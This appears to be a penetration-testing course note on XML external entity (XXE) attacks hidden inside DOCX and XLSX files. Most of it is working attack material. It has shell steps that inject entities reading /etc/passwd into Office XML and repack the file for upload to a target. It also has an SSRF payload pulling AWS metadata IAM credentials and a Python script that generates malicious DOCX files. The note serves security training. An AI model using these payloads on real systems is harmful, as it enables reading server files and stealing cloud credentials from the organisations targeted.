---
tags: [vapt, xxe, intermediate]
difficulty: intermediate
module: "14 - XXE"
topic: "14.05 XXE via XLSX / DOCX"
---

# 14.05 — XXE via XLSX / DOCX

## Office Formats Are ZIP + XML

```
DOCX, XLSX, PPTX, ODP, etc. are ZIP archives containing XML files!

DOCX structure:
  document.docx (rename to .zip → extract)
  ├── [Content_Types].xml
  ├── _rels/
  │   └── .rels
  ├── word/
  │   ├── document.xml    ← main content
  │   ├── settings.xml
  │   └── _rels/
  │       └── document.xml.rels  ← relationships (external refs!)
  └── docProps/
      └── core.xml

XLSX structure:
  spreadsheet.xlsx
  ├── [Content_Types].xml
  ├── xl/
  │   ├── workbook.xml
  │   ├── worksheets/
  │   │   └── sheet1.xml  ← spreadsheet data
  │   └── sharedStrings.xml
  └── _rels/
      └── workbook.xml.rels

ANY OF THESE XML FILES CAN CONTAIN XXE PAYLOADS!
```

---

## Creating a Malicious DOCX

```bash
# STEP 1: CREATE A LEGITIMATE DOCX:
#   Open Word → create a simple document → save as test.docx

# STEP 2: EXTRACT THE ZIP:
mkdir docx_attack && cp test.docx docx_attack/
cd docx_attack
unzip test.docx -d extracted/

# STEP 3: INJECT XXE INTO document.xml:
cat > extracted/word/document.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w:document [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas"
            xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
            xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
EOF

# STEP 4: REPACK AS DOCX:
cd extracted/
zip -r ../malicious.docx . && cd ..

# STEP 5: UPLOAD malicious.docx TO TARGET
```

---

## Creating a Malicious XLSX

```bash
# STEP 1: START WITH A VALID XLSX:
mkdir xlsx_attack && cp test.xlsx xlsx_attack/
cd xlsx_attack
unzip test.xlsx -d extracted/

# STEP 2: INJECT XXE INTO sharedStrings.xml (or sheet1.xml):
cat > extracted/xl/sharedStrings.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE si [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <si><t>&xxe;</t></si>
</sst>
EOF

# STEP 3: REPACK:
cd extracted/ && zip -r ../malicious.xlsx . && cd ..

# STEP 4: UPLOAD malicious.xlsx TO TARGET
# Common upload points: import data, spreadsheet parser, report generator
```

---

## When Does Office XXE Work?

```
SCENARIOS WHERE OFFICE FILE XXE TRIGGERS:

SERVER-SIDE PROCESSING:
  ✓ Document viewer (converts DOCX to HTML/PDF for preview)
  ✓ Data import (imports spreadsheet data into database)
  ✓ Report generation (user uploads XLSX template)
  ✓ OCR/text extraction service
  ✓ Document indexing for search
  ✓ Resume/CV parser
  ✓ Invoice processing systems
  ✓ LibreOffice/OpenOffice document conversion
  
LIBRARIES THAT PARSE OFFICE FILES:
  Apache POI (Java) → XXE vulnerable if external entities enabled
  python-docx → generally safe (no external entities)
  OpenPyXL → generally safe
  LibreOffice/unoconv → can be vulnerable
  PHPWord → depends on configuration
  
DETECTION:
  1. Upload valid DOCX → is it processed/parsed server-side?
  2. Upload invalid ZIP → does server error with "invalid ZIP"?
  3. Upload DOCX with invalid XML → "XML parsing error"?
  4. Upload DOCX with Collaborator entity → does Burp Collaborator ping?
```

---

## SSRF via Office XXE

```xml
<!-- INJECT INTO document.xml TO TRIGGER SSRF: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE w:document [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
</w:document>

<!-- IF SERVER PROCESSES:
  → Fetches AWS metadata
  → Contents embedded in rendered document/response
  → Cloud credentials stolen!
-->
```

---

## Automated Tool: docx-xxe-payload

```bash
# QUICK DOCX XXE GENERATOR (Python):
python3 - << 'PYEOF'
import zipfile, io, shutil

def create_xxe_docx(output_path, entity_url):
    # Minimal valid DOCX with XXE
    content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>'''

    rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>'''

    document = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w:document [<!ENTITY xxe SYSTEM "{entity_url}">]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
</w:document>'''

    with zipfile.ZipFile(output_path, 'w') as zf:
        zf.writestr('[Content_Types].xml', content_types)
        zf.writestr('_rels/.rels', rels)
        zf.writestr('word/document.xml', document)
    print(f"Created: {output_path}")

create_xxe_docx('xxe_passwd.docx', 'file:///etc/passwd')
create_xxe_docx('xxe_aws.docx', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/')
PYEOF
```

---

## Related Notes
- [[01 - What is XXE]] — fundamentals
- [[04 - XXE via SVG Upload]] — SVG XXE
- [[06 - Blind XXE OOB]] — when no response echo
- [[08 - XXE to SSRF]] — SSRF chain
- [[Module 13 - SSRF]] — SSRF module
